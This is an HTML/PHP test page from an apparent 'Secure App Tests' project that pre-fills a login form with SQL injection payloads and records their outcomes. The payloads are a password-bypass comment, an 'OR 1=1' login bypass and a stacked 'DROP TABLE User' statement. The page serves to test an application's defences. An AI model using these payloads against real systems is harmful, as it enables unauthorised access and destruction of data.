<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="../resources/secure_app.css">
    <link rel="icon" type="image/svg" href="../resources/Header_Lock_Image.svg">
    <meta charset="utf-8" />
    <title>Secure App Tests - SQL Injection Login Test</title>
</head>

<body>
    <div id="wrapper">
        <header>
            <table class="header_table">
                <tbody>
                <tr>
                    <td class="lock"><img src="../resources/Header_Lock_Image.svg" style="width:9vh;" alt="Header_lock"></td>
                    <td class="title"><b>Secure App Tests</b></td>
                    <td class="header_table_cell"></td>
                </tr>
                </tbody>
            </table>
        </header>

        <main>
            <h1>SQL Injection Log In Test</h1>
            <div class=horizontal_line>
                <hr>
            </div>
            <br><br>
            <div style="text-align:center">
                <div class = "login">
                    <label class="sqlinject_label">Injection type:</label>
                    <select name="sqlinject" id="sqlinject" onchange="changeinjection()">
                        <optgroup label="SQL Injection">
                            <option selected="selected" value="1" >Ignore password</option>
                            <option value="2">Delete user table</option>
                            <option value="3">No credentials</option>
                        </optgroup>
                    </select>
                    <?php
                    $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
                    if ("login=fail" == parse_url($url, PHP_URL_QUERY))
                    {
                        echo "The username/password is invalid.";
                    }
                    ?>
                    <form action="../src/login.php" method="POST">
                        <label style="float: left" for="username">Username:&nbsp;&nbsp;</label>
                        <input type="text" id="username" name="username" value="admin@email.com'--"><br><br>
                        <label style="float: left" for="password">Password:&nbsp;&nbsp;</label>
                        <input type="password" id="password" name="password"><br><br>
                        <input type="submit" value="Submit">
                    </form>
                </div>
                <div id="injection">
                    <p>Statement to execute: </p>
                    <p>Select * FROM User WHERE Email='admin@email.com'–-' AND Password='';</p>
                    <p>Intended result: Ignores AND Password='' because -- is a comment </p>
                    <p>Actual result: Same as intended </p>
                </div>
            </div>
        </main>
    </div>
    <script>
        function changeinjection ()
        {
            //get elements from page
            var sqlinject = document.getElementById("sqlinject");
            var injectiondiv = document.getElementById("injection");
            var usernamefield = document.getElementById("username");
            var passwordfield = document.getElementById("password");


            //change parts of page depending on selection
            try
            {
                while (injectiondiv.removeChild(injectiondiv.childNodes[0]) !== null)
                {
                    //tries to remove all previous elements in the div
                }
            }
            catch
            {
                //succeeds when it throws exception
            }

            if(sqlinject.options[sqlinject.selectedIndex].text === "Ignore password")
            {
                injectiondiv.innerHTML = "<p>Statement to execute: </p>" +
                    " <p>Select * FROM User WHERE Email='student@email.com'–- AND Password='';</p>" +
                    "<p>Intended result: Ignores AND Password='' because -- is a comment </p>" +
                    "<p>Actual result: Same as intended </p>";
                usernamefield.value = "student@email.com'--";
            }
            else if(sqlinject.options[sqlinject.selectedIndex].text === "Delete user table")
            {
                injectiondiv.innerHTML = "<p>Statement to execute: </p> " +
                    "<p>Select * FROM User WHERE Email='student@email.com' AND Password= Password3'; DROP TABLE User;</p>" +
                    "<p>Intended result: Drops the User table after logging in </p>" +
                    "<p>Actual result: Logs in, but does not drop user table. query seems to not support batch instructions. </p>";
                usernamefield.value = "student@email.com";
                passwordfield.value = "Password3'; DROP TABLE User;";
            }
            else if(sqlinject.options[sqlinject.selectedIndex].text === "No credentials")
            {
                injectiondiv.innerHTML = "<p>Statement to execute: </p> " +
                    "<p>Select * FROM User WHERE Email='student@email.com' OR 1=1;-- AND Password='';</p>" +
                    "<p>Intended result: Logs in as the first user (Admin) </p>" +
                    "<p>Actual result: Same as intended</p>";
                usernamefield.value = "student@email.com' OR 1=1;--";
            }
        }
    </script>
</body>


</html>